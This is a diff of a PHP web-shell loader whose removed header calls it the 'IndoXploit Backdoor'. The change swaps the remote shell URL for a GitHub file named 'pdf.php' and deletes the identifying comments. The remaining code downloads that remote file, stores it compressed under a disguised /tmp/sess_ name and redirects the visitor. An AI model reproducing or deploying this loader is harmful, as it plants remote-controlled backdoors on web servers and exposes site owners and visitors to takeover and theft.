@@ -1,10 +1,6 @@
 <?php
-# IndoXploit Backdoor
-# Bypass 406 Not Acceptable & Auto Delete Shell
-# Coded by: L0c4lh34rtz - IndoXploit
- 
-$URL = 'https://raw.githubusercontent.com/justikail/webshell/main/alfa-new.php';  # Backdoor URL
-$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!
+$URL = 'https://raw.githubusercontent.com/Liong365/pr/main/pdf.php';
+$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php';
  
 function M() {
     $FGT = @gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(file_get_contents($GLOBALS['URL'])))))));
@@ -15,7 +11,7 @@ function M() {
         fwrite($HANDLE, $FGT);
         fclose($HANDLE);
     }
-    echo '<script>window.location="?LOL";</script>';
+    echo '<script>window.location="?404s";</script>';
 }
  
 if(file_exists($TMP)) {
